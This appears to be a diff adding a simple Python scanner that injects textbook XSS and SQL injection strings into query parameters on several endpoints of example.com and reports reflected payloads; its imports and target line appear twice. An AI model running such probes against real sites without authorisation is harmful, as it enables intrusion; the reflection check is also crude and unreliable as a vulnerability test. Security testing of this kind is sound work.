@@ -1,0 +1,48 @@
+import requests
+
+# Define the target website to scan
+target_url = "https://example.com"
+
+import requests
+
+# Define the target website to scan
+target_url = "https://example.com"
+
+# Define the payloads for the XSS and SQL injection attacks
+xss_payload = "<script>alert('XSS attack!')</script>"
+sql_payload = "1' OR '1'='1"
+
+# Define the list of endpoints to test for vulnerabilities
+endpoints = [
+    "/login",
+    "/search",
+    "/contact",
+    "/about",
+    "/admin",
+    "/profile",
+]
+
+# Define a list of payloads to test for each parameter
+payloads = {
+    "q": [
+        "<script>alert('XSS attack!')</script>",
+        "' OR 1=1 --",
+    ],
+    "id": [
+        "1' OR '1'='1",
+        "1 AND 1=2",
+    ],
+}
+
+# Loop through each endpoint and test for vulnerabilities
+for endpoint in endpoints:
+    for param, values in payloads.items():
+        for value in values:
+            # Construct the URL with the parameter and payload
+            url = target_url + endpoint + "?" + param + "=" + value
+
+            # Send the request and check for vulnerability
+            response = requests.get(url)
+
+            if value in response.text:
+                print("Potential " + param + " injection vulnerability found at " + url)
